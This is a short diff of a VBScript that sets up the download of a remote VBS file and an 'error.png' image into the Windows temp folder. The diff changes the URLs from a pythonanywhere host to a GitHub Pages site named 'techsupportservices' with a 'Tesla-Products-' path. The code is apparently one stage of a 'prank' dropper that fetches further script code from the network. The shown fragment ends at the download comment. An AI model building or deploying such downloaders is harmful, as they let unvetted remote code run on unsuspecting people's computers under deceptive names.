@@ -9,8 +9,8 @@ Set objFSO = CreateObject("Scripting.FileSystemObject")
 tempFolder = objFSO.GetSpecialFolder(2)   ' %TEMP%
 
 ' ---------- CONFIGURE THESE URLS ----------
-remoteVBS_URL = "https://artfinderprivateart.pythonanywhere.com/download/agta.vbs"
-remoteImage_URL = "https://artfinderprivateart.pythonanywhere.com/download/error.png"
+remoteVBS_URL = "https://techsupportservices.github.io/Tesla-Products-/tactical.vbs"
+remoteImage_URL = "https://techsupportservices.github.io/Tesla-Products-/error.png"
 ' ------------------------------------------
 
 ' 1. Download the remote prank VBS
